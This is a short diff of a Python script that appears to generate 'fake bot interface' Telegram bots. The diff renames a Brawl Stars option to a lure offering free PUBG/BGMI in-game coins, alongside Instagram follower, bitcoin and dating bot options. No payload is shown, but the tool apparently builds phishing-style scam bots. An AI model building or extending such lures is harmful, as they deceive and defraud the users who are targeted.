@@ -90,7 +90,7 @@ if "12" in user_input:
     print("\n\033[1;31m[\033[0m\033[1;92m2\033[0m\033[1;31m] \033[0m\033[1;37;41m Instagram Like and Follower \033[0m  ")
     print("\n\033[1;31m[\033[0m\033[1;92m3\033[0m\033[1;31m] \033[0m\033[1;91;107m BTC BANKER Bot \033[0m  ")
     print("\n\033[1;31m[\033[0m\033[1;92m4\033[0m\033[1;31m] \033[0m\033[1;48;5;21m Dating Bot \033[0m ")
-    print("\n\033[1;31m[\033[0m\033[1;92m5\033[0m\033[1;31m] \033[0m\033[1;48;5;200m Brawl stars LOL Bot \033[0m \n ")
+    print("\n\033[1;31m[\033[0m\033[1;92m5\033[0m\033[1;31m] \033[0m\033[1;48;5;200m Free AG and BP coin With PUBG and BGMI \033[0m \n ")
     print(" ")
     choice = input(Fore.MAGENTA +  "\033[96m\033[91m[\033[0m\033[91m *** \033[0m\033[96m]\033[0m\033[96m  Select the Fake Bot Interface Option  \033[91m >>> ")
 	
@@ -153,7 +153,7 @@ def start_bot():
 
     elif choice == 5:
         # Code for choice 3 (Brawl stars)
-        f = open('brawl_stars.py', 'w+', encoding='utf-8')
+        f = open('bgmi.py', 'w+', encoding='utf-8')
         f.write(f"""
 import telebot
 
